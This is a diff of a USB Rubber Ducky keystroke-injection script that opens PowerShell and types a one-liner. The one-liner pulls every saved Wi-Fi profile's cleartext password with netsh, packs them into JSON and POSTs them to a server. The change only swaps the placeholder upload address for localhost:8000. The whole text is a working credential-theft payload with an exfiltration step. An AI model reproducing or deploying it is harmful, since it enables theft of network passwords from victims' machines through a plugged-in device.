@@ -9,6 +9,6 @@ STRING powershell
 DELAY 700
 ENTER
 DELAY 1000
-STRING $data = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | ConvertTo-Json; Invoke-WebRequest -Uri http://<YOUR_SERVER_ADDRESS>/upload -Method POST -Body $data -ContentType 'application/json'
+STRING $data = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | ConvertTo-Json; Invoke-WebRequest -Uri http://localhost:8000 -Method POST -Body $data -ContentType 'application/json'
 DELAY 4000
 ENTER
